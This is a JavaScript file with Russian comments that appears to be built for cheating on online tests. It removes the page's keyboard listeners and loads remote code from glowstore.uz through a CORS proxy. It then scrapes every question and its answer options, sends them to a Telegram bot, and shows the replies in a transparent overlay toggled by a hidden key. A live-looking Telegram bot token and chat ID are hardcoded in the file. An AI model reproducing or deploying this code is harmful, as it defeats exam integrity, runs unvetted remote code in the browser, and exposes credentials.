// main.js

// Отключаем старые слушатели
$(document).off('keydown keypress keyup');
$(window).off('keydown keypress keyup');

// Telegram Bot данные
const telegramToken = '7744466941:AAEyIGPkPRKgPq8WTsOV_otNWyhSqqPTP_I';
const chatId = '1213293747';

// Прокси для обхода CORS
const CORS_PROXY = 'https://thingproxy.freeboard.io/fetch/';

// 1) Динамический импорт a.js через прокси
(async () => {
  try {
    await import(`${CORS_PROXY}https://glowstore.uz/a.js`);
    console.log('a.js загружен через прокси');
  } catch (e) {
    console.error('Ошибка импорта a.js:', e);
  }
})();

let lastProcessedUpdateId = 0;

function createMiniWindow() {
    const miniWindowHTML = `
        <div id="mini-window" style="display: none;">
            <div id="mini-window-content">--</div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', miniWindowHTML);

    const style = document.createElement('style');
    style.innerHTML = `
#mini-window {
    position: fixed;
    bottom: 10px;
    right: 10px;
    width: 200px;
    height: 200px;
    background: rgba(255, 255, 255, 0);
    border: none;
    border-radius: 5px;
    overflow-y: auto;
    z-index: 1000;
    font-family: Arial, sans-serif;
}
/* … остальные стили без изменений … */
    `;
    document.head.appendChild(style);
}

function toggleMiniWindow() {
    const win = document.getElementById('mini-window');
    if (!win) return;
    win.style.display = win.style.display === 'none' ? 'block' : 'none';
}

function appendMessageToMiniWindow(text) {
    const container = document.getElementById('mini-window-content');
    if (!container) return;
    const msg = document.createElement('p');
    msg.textContent = text;
    container.appendChild(msg);
    container.scrollTop = container.scrollHeight;
}

async function getNewAnswersFromTelegram() {
    const url = `https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}`;
    // используем прокси
    const response = await fetch(`${CORS_PROXY}${url}`);
    const data = await response.json();

    if (data.ok) {
        data.result.forEach(msg => {
            const text = msg.message?.text;
            const updateId = msg.update_id;
            if (text && updateId > lastProcessedUpdateId) {
                lastProcessedUpdateId = updateId;
                appendMessageToMiniWindow(text);
            }
        });
    }
}

document.addEventListener('keyup', e => {
    if (e.key.toLowerCase() === 'm') toggleMiniWindow();
});
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    toggleMiniWindow();
});

function extractImageLinks(element) {
    const images = element?.querySelectorAll('img') || [];
    return Array.from(images).map(img => img.src).join('\n');
}

async function sendQuestionToTelegram(question) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    // и здесь прокси
    const response = await fetch(`${CORS_PROXY}${url}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: question }),
    });

    if (!response.ok) {
        console.error('Ошибка отправки вопроса:', await response.text());
    } else {
        console.log('Вопрос успешно отправлен:', question);
    }
}

async function processAndSendQuestions() {
    const tests = document.querySelectorAll('.table-test');
    const sortedTests = Array.from(tests).sort((a, b) => {
        const idA = +a.id.replace(/\D/g, '');
        const idB = +b.id.replace(/\D/g, '');
        return idA - idB;
    });

    for (let i = 0; i < sortedTests.length; i++) {
        const test = sortedTests[i];
        let messageContent = `Вопрос ${i + 1}:\n`;
        const question = test.querySelector('.test-question p')?.textContent.trim() || 'Вопрос не найден';
        messageContent += question + '\n\n';

        const questionImages = extractImageLinks(test.querySelector('.test-question'));
        if (questionImages) {
            messageContent += `Изображения в вопросе:\n${questionImages}\n\n`;
        }

        const answers = Array.from(test.querySelectorAll('.answers-test li')).map(li => {
            const variant = li.querySelector('.test-variant')?.textContent.trim() || '';
            const answerText = li.querySelector('label p')?.textContent.trim() || '';
            const imgLinks = extractImageLinks(li);
            return `${variant}. ${answerText}` + (imgLinks ? ` (Изображение: ${imgLinks})` : '');
        });

        messageContent += 'Варианты ответов:\n' + answers.join('\n');
        await sendQuestionToTelegram(messageContent);
    }
}

createMiniWindow();
setInterval(getNewAnswersFromTelegram, 5000);
processAndSendQuestions();

// ————————————————
// По ошибке 
//   "A listener indicated an asynchronous response by returning true, 
//    but the message channel closed before a response was received"
// — это предупреждение, которое идёт из какого-то расширения или content script (не из вашего кода).
// Его можно игнорировать или найти конфликтное расширение и убрать return true без sendResponse().
